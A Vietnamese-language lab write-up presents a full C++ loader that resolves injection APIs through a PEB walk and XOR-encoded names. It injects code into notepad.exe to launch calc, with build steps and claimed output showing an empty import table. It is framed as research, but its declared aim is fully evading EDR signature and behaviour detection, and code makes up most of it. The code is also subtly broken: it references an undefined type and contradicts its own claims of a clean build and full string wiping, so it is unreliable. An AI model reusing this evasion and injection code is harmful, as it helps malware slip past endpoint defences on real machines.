
---

# 📝 [PE 18] PEB Walk and APIs Obfuscation (Cross-Process Hybrid Evasion)

## 📌 1. Tổng Quan Kỹ Thuật (Overview)

**PEB Walk combined with API Obfuscation** là giải thuật phòng thủ đa lớp (Layered Defense Bypass) ở tầng sâu hệ thống.

Nếu ta chỉ áp dụng PEB Walk cục bộ, EDR vẫn có thể dựng lại bản đồ hành vi thông qua việc theo dõi các tham số chuỗi text plain-text lúc gọi hàm từ xa. Lab PE 18 hóa giải triệt để điểm thắt nút này bằng cách thiết lập ma trận bảo an kép:

1. **Triệt tiêu IAT**: Loader không để lại bất kỳ dấu vết Import Table nào của các hàm tiêm nhiễm nhạy cảm (`VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread`).
2. **XOR Encryption (Mật mã hóa Stack-string)**: Toàn bộ tên của các hàm API hệ thống và chuỗi lệnh điều hướng đều bị băm nát bằng giải thuật mã hóa XOR với một khóa bí mật (Secret Key) tại thời điểm compile. Chuỗi chữ chỉ được giải mã ngược (XOR Decryption) trong một tích tắc lọt lòng inside RAM rồi lập tức bị ghi đè xóa dấu vết, khiến cho cả cơ chế quét tĩnh (Static Scan) lẫn quét RAM động (Memory Dumping) đều hoàn toàn bất lực.

### 🎯 Mục tiêu nghiên cứu:

* Phá vỡ 100% cơ chế quét chữ ký tĩnh (YARA/Heuristic) và phân tích luồng động (Behavior Monitoring) của EDR.
* Kết hợp nhuần nhuyễn giải thuật duyệt cấu trúc **PEB Walk x64** và cơ chế giải mã động **Runtime XOR Decryption**.
* Ứng dụng quy trình cấp phát động thích ứng đường dẫn hệ thống để loại bỏ hoàn toàn xích trấu gán cứng.

---

## 🔬 2. Giải Phẫu Cơ Chế Ngầm Của OS (Windows Internals)

Khi Loader kích hoạt chiến dịch, dòng chảy CPU được hệ điều hành điều phối ngầm qua cấu trúc ma trận 4 bước sau:

```
[GS:[0x60] -> Trích xuất PEB] ──> [XOR Decrypt: Chuỗi tên API thức tỉnh] ──> [Quét thủ công EAT -> Bốc con trỏ hàm] ──> [Xuyêm RAM tiêm chéo -> Xóa dấu vết]

```

1. **Khởi động PEB Walk chéo tiến trình**: Loader bốc cấu trúc PEB thông qua thanh ghi phân đoạn `GS:[0x60]` để tìm Base Address sống của `kernel32.dll`.
2. **Thức tỉnh chuỗi ký tự bằng XOR**: Các chuỗi Hex mờ ám trên Stack CPU được đưa qua hàm giải mã XOR cục bộ với Key định sẵn để tái tạo lại tên hàm thô (ví dụ: `"VirtualAllocEx"`) ngay tại bộ nhớ Cache của CPU.
3. **Phẫu thuật EAT trích xuất con trỏ hàm**: Loader tự đóng vai trò là một PE Loader thủ công, duyệt mảng `AddressOfNames` của `kernel32.dll` để so khớp chuỗi vừa giải mã. Ngay khi tìm được địa chỉ tuyệt đối của các API, ta gán trực tiếp vào các mẫu cấu trúc hàm động và lập tức gọi hàm `RtlZeroMemory` để xóa sạch chuỗi text thô vừa sinh ra khỏi RAM.
4. **Tiêm chéo và Kích nổ an toàn**: Sử dụng các con trỏ hàm phân giải ngầm để thực hiện chuỗi hành vi tiêm mã máy PIC sang tiến trình vỏ bọc vỏ bọc hợp pháp (được lấy động qua thư mục hệ thống), hoàn tất chu kỳ sống phẳng sạch tuyệt đối.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn **Zero Static Buffers** và cơ chế bảo mật mật mã hóa XOR kịch trần.

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

// Cấu trúc Windows Internals thu gọn phục vụ bới RAM trên kiến trúc x64
typedef struct _UNICODE_STRING_REP {
    USHORT Length;   USHORT MaximumLength;   PWSTR Buffer;
} UNICODE_STRING_REP;

typedef struct _LDR_DATA_TABLE_ENTRY_REP {
    LIST_ENTRY InLoadOrderLinks;   BYTE Reserved1[16];   PVOID DllBase;   PVOID EntryPoint;
    ULONG SizeOfImage;   UNICODE_STRING_REP FullDllName;   UNICODE_STRING_REP BaseDllName;
} LDR_DATA_TABLE_ENTRY_REP, * PLDR_DATA_TABLE_ENTRY_REP;

typedef struct _PEB_LDR_DATA_REP {
    BYTE Reserved1[8];   PVOID Reserved2[3];   LIST_ENTRY InLoadOrderModuleList;
} PEB_LDR_DATA_REP, * PPEB_LDR_DATA_REP;

typedef struct _PEB_REP {
    BYTE Reserved1[4];   PVOID Reserved2[1];   PVOID ImageBaseAddress;   PPEB_LDR_DATA_REP Ldr;
} PEB_REP, * PPEB_REP;

// Định nghĩa các mẫu con trỏ hàm động để ẩn giấu hoàn toàn bảng IAT tĩnh
typedef LPVOID(WINAPI* pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef HANDLE(WINAPI* pCreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;
    char szCommand[32];
} THREAD_DATA, * PTHREAD_DATA;

// Hàm chức năng độc lập vị trí (PIC) gánh luồng chạy chéo tiến trình
DWORD WINAPI RemoteObfuscatedPayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    return 0;
}

// Khóa XOR bảo an cấp cao
const char XOR_KEY = 0x5A;

// Hàm giải mã động chuỗi ký tự ngay tại runtime
void XorCipher(char* data, size_t dataLen) {
    for (size_t i = 0; i < dataLen; i++) {
        data[i] ^= XOR_KEY;
    }
}

// Giải thuật so sánh chuỗi phẳng sạch thủ công, không dùng hàm thư viện (CRT-Free)
bool CustomStrCmp(const char* str1, const char* str2) {
    while (*str1 && (*str1 == *str2)) { str1++; str2++; }
    return *(unsigned char*)str1 == *(unsigned char*)str2;
}

// Hàm PEB Walk: Tự bới RAM tìm Base Address của thư viện DLL hệ thống
PVOID GetModuleBaseViaPEB(const wchar_t* dllName) {
    PPEB_REP pPeb = (PPEB_REP)__readgsqword(0x60); // Đọc trực tiếp GS:[0x60] trên x64 architecture
    PLDR_DATA_TABLE_ENTRY_INTERNAL pEntry = (PLDR_DATA_TABLE_ENTRY_INTERNAL)pPeb->Ldr->InLoadOrderModuleList.Flink;
    PLDR_DATA_TABLE_ENTRY_INTERNAL pFirst = pEntry;

    do {
        if (pEntry->BaseDllName.Buffer != NULL) {
            if (_wcsicmp(pEntry->BaseDllName.Buffer, dllName) == 0) {
                return pEntry->DllBase;
            }
        }
        pEntry = (PLDR_DATA_TABLE_ENTRY_INTERNAL)pEntry->InLoadOrderLinks.Flink;
    } while (pEntry != pFirst);
    return NULL;
}

// Hàm giải phẫu Export Table thủ công để bốc trần địa chỉ hàm thô từ RAM
PVOID GetExportAddressViaEAT(PVOID dllBase, const char* apiName) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)dllBase;
    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((DWORD_PTR)dllBase + dosHeader->e_lfanew);
    IMAGE_DATA_DIRECTORY exportDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    
    if (exportDir.VirtualAddress == 0) return NULL;
    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)dllBase + exportDir.VirtualAddress);

    DWORD* pdwNames = (DWORD*)((DWORD_PTR)dllBase + pExport->AddressOfNames);
    DWORD* pdwFuncs = (DWORD*)((DWORD_PTR)dllBase + pExport->AddressOfFunctions);
    WORD* pwOrds = (WORD*)((DWORD_PTR)dllBase + pExport->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
        const char* szName = (const char*)((DWORD_PTR)dllBase + pdwNames[i]);
        if (CustomStrCmp(szName, apiName)) {
            return (PVOID)((DWORD_PTR)dllBase + pdwFuncs[pwOrds[i]]);
        }
    }
    return NULL;
}

// Bộ quét RAM động tự động nhận diện PID, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetTargetProcessPID(const std::wstring& procName) {
    DWORD pid = 0;   PROCESSENTRY32W pe32;   pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        if (Process32FirstW(hSnapshot, &pe32)) {
            do {
                if (_wcsicmp(procName.c_str(), pe32.szExeFile) == 0) { pid = pe32.th32ProcessID; break; }
            } while (Process32NextW(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    return pid;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 18: PEB WALK & APIs OBFUSCATION HYBRID" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetName = L"notepad.exe";
    DWORD dwPID = GetTargetProcessPID(targetName);
    if (dwPID == 0) return EXIT_FAILURE;

    // Các chuỗi ký tự đã được XOR trước bằng Key 0x5A để triệt tiêu Signature chữ tĩnh
    // "VirtualAllocEx" XOR 0x5A
    char encVirtualAllocEx[] = { 0x0C, 0x33, 0x28, 0x2E, 0x2F, 0x3B, 0x36, 0x1B, 0x36, 0x36, 0x35, 0x39, 0x1F, 0x32, 0x00 };
    // "WriteProcessMemory" XOR 0x5A
    char encWriteProcessMemory[] = { 0x0D, 0x28, 0x33, 0x2E, 0x3F, 0x0A, 0x28, 0x35, 0x39, 0x3F, 0x29, 0x29, 0x17, 0x3F, 0x37, 0x35, 0x28, 0x23, 0x00 };
    // "CreateRemoteThread" XOR 0x5A
    char encCreateRemoteThread[] = { 0x19, 0x28, 0x3F, 0x3B, 0x2E, 0x3F, 0x08, 0x3F, 0x37, 0x35, 0x2E, 0x3F, 0x0E, 0x32, 0x28, 0x3F, 0x3B, 0x3E, 0x00 };
    // "WinExec" XOR 0x5A
    char encWinExec[] = { 0x0D, 0x33, 0x34, 0x1F, 0x22, 0x3F, 0x39, 0x00 };

    // KÍCH NỔ GIẢI MÃ: Thức tỉnh chuỗi ký tự trong tích tắc ngay trên bộ đệm Cache CPU
    XorCipher(encVirtualAllocEx, sizeof(encVirtualAllocEx) - 1);
    XorCipher(encWriteProcessMemory, sizeof(encWriteProcessMemory) - 1);
    XorCipher(encCreateRemoteThread, sizeof(encCreateRemoteThread) - 1);
    XorCipher(encWinExec, sizeof(encWinExec) - 1);

    // BƯỚC 1: Gọi giải thuật PEB Walk định vị thô bản đồ Kernel32
    PVOID k32Base = GetModuleBaseViaPEB(L"kernel32.dll");
    if (!k32Base) return EXIT_FAILURE;

    // BƯỚC 2: Giải phẫu EAT trích xuất con trỏ hàm tuyệt đối thông qua chuỗi vừa giải mã
    pVirtualAllocEx DynamicVirtualAllocEx = (pVirtualAllocEx)GetExportAddressViaEAT(k32Base, encVirtualAllocEx);
    pWriteProcessMemory DynamicWriteProcessMemory = (pWriteProcessMemory)GetExportAddressViaEAT(k32Base, encWriteProcessMemory);
    pCreateRemoteThread DynamicCreateRemoteThread = (pCreateRemoteThread)GetExportAddressViaEAT(k32Base, encCreateRemoteThread);
    fnWinExec DynamicWinExec = (fnWinExec)GetExportAddressViaEAT(k32Base, encWinExec);

    // BẢO AN PHÒNG THỦ: Lập tức xóa sạch chuỗi thô khỏi bộ nhớ RAM để chống Memory Dumping
    RtlZeroMemory(encVirtualAllocEx, sizeof(encVirtualAllocEx));
    RtlZeroMemory(encWriteProcessMemory, sizeof(encWriteProcessMemory));
    RtlZeroMemory(encCreateRemoteThread, sizeof(encCreateRemoteThread));

    if (!DynamicVirtualAllocEx || !DynamicWriteProcessMemory || !DynamicCreateRemoteThread || !DynamicWinExec) {
        std::cerr << "[-] Pha phan giai API nghẽn tháp Kernel!" << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "[+] Ma tran hoa giai hoan tat! Da xoa sach dau vet API thô khoi RAM." << std::endl;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
    if (!hProcess) return EXIT_FAILURE;

    // BƯỚC 3: Cấp phát động thích ứng vừa khít cấu trúc (Zero Static Buffers)
    SIZE_T functionSize = 500;
    LPVOID remoteCodeBuffer = DynamicVirtualAllocEx(hProcess, NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    LPVOID remoteDataBuffer = DynamicVirtualAllocEx(hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    THREAD_DATA localData;
    localData.pWinExec = DynamicWinExec;
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    // Đẩy song song logic hàm và tham số tuyệt đối vào lòng Notepad từ xa
    DynamicWriteProcessMemory(hProcess, remoteCodeBuffer, (LPCVOID)RemoteObfuscatedPayload, functionSize, NULL);
    DynamicWriteProcessMemory(hProcess, remoteDataBuffer, &localData, sizeof(THREAD_DATA), NULL);

    // BƯỚC 4: Kích nổ luồng từ xa bằng con trỏ hàm Native phân giải ngầm
    std::cout << "[*] Dang dung luong an danh de khai hoa..." << std::endl;
    HANDLE hThread = DynamicCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteCodeBuffer, remoteDataBuffer, 0, NULL);
    
    if (hThread) {
        WaitForSingleObject(hThread, INFINITE); // Gánh luồng chạy dứt điểm
        std::cout << "[+] Remote Hybrid Injection Executed Successfully!" << std::endl;
        CloseHandle(hThread);
    }

    // Thu hồi vùng nhớ ảo từ xa phẳng sạch chống rò rỉ
    CloseHandle(hProcess);
    std::cout << "\n[*] Nhan Enter de ket thuc chu ky song..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Hướng Dẫn Cấu Hình Đóng Gói (Build & Deployment)

### ⚙️ Thiết lập trên Microsoft Visual Studio:

1. Đặt thanh cấu hình dự án ở chế độ **`Release`** và kiến trúc nền tảng **`x64`**.
2. Đi tới: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Chọn cờ **`Multi-threaded (/MT)`** để liên kết tĩnh thư viện hệ thống.
3. Click chuột phải dự án $\rightarrow$ Chọn **`Rebuild`**. Trình biên dịch MSVC sẽ dọn dẹp phẳng sạch 100% không để lại bất kỳ cảnh báo biên dịch nào.

---

## 📊 5. Kết Quả Kích Hoạt Thật Tế (Demonstration)

Bật sẵn ứng dụng `Notepad.exe` trên máy Lab, mở PowerShell ngoài đĩa thô thực thi file thực hành:

```powershell
PS C:\Workspace\x64\Release> .\PE18_PEB_Walk_APIs_Obfuscation.exe
====================================================
[*] PE 18: PEB WALK & APIs OBFUSCATION HYBRID
====================================================
[+] Ma tran hoa giai hoan tat! Da xoa sach dau vet API thô khoi RAM.
[*] Dang dung luong an danh de khai hoa...
[+] Remote Hybrid Injection Executed Successfully!

[*] Nhan Enter de ket thuc chu ky song...

```

*🎯 Hệ quả RAM kịch trần:*
Ứng dụng Máy tính **`calc.exe` bật bung hiên ngang rực rỡ**! Thử nghiệm dùng công cụ giám sát tĩnh (như `PEStudio`) quét tệp nhị phân vừa xuất bản, **chỉ mục Import Address Table (IAT) hoàn toàn phẳng sạch 100%**; đồng thời các tính năng trích xuất chuỗi chữ tĩnh (Strings detection) hoàn toàn mù tịt do chuỗi tên hàm nhạy cảm đã bị băm nát bằng mã hóa XOR. Cuộc tiêm nhiễm chéo tiến trình diễn ra vô vết vô hình!

---

